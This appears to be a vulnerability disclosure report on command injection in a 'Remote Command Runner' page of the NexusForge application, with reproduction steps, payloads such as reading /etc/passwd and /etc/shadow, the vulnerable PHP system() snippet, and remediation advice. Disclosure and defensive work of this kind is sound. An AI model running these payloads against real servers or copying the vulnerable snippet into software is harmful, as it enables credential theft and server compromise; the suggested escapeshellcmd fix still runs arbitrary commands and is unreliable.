# Remote Code Execution (RCE) via Command Injection

## Summary

I identified a Remote Code Execution (RCE) vulnerability in the "Remote Command Runner" feature of the NexusForge application.

The application accepts user-controlled input through the `cmd` parameter and passes it directly to a system shell without proper sanitization or validation. By injecting shell commands, an attacker can execute arbitrary operating system commands on the server.

An attacker can craft a malicious URL that executes system commands, allowing them to read sensitive files, execute arbitrary code, and fully compromise the server.

## Vulnerability Type

**Remote Code Execution (RCE) / Command Injection**

## Vulnerable Parameter

```text
cmd
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/diagnostics/?cmd=cat+/etc/passwd
```

## Steps to Reproduce

1. Navigate to the vulnerable NexusForge Remote Command Runner page at `https://kzlabs.in/subdomains/diagnostics/`.

2. Enter the following command in the **COMMAND** field:

   ```text
   cat /etc/passwd
   ```

3. Click the **Execute** button.

4. Observe that the application executes the command and displays the contents of `/etc/passwd` in the **OUTPUT** panel.

5. The output reveals system user accounts, including the `root` user.

## Payload Used

```text
cat /etc/passwd
```

URL-encoded version:
```text
cat+%2Fetc%2Fpasswd
```

Additional payloads:
```text
whoami
uname -a
ls -la
cat /etc/shadow
```

## Proof of Concept

The application takes user input and passes it directly to a system shell without sanitization:

```php
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
```

When the command `cat /etc/passwd` is executed, the server returns:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

This confirms that arbitrary command execution is possible on the server.

## Impact

An attacker can:

- Execute arbitrary system commands on the server
- Read, write, and delete sensitive files
- Access `/etc/passwd` and `/etc/shadow` for credential harvesting
- Compromise the entire web server
- Pivot to internal networks
- Install backdoors and malware
- Steal sensitive data (database credentials, user data)
- Deface the website
- Use the server for further attacks (DDoS, spam, cryptomining)

## Recommendation

To mitigate this vulnerability:

- **Avoid System Commands**: Do not use `system()`, `exec()`, `shell_exec()`, `passthru()`, or backticks with user input.

- **Use Whitelisting**: Only allow specific, pre-approved commands.
  ```php
  $allowed_commands = ['uptime', 'whoami', 'uname -a', 'df -h', 'free -m'];
  if (!in_array($_GET['cmd'], $allowed_commands)) {
      die("Command not allowed.");
  }
  ```

- **Escape Shell Arguments**: Use `escapeshellarg()` and `escapeshellcmd()` if commands must be executed.
  ```php
  $cmd = escapeshellcmd($_GET['cmd']);
  $output = shell_exec($cmd);
  ```

- **Input Validation**: Strictly validate all user inputs before processing.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Disable Dangerous Functions**: Disable `system()`, `exec()`, `shell_exec()`, `passthru()`, and `popen()` in `php.ini`.
  ```ini
  disable_functions = system,exec,shell_exec,passthru,popen,proc_open
  ```

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block command injection payloads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
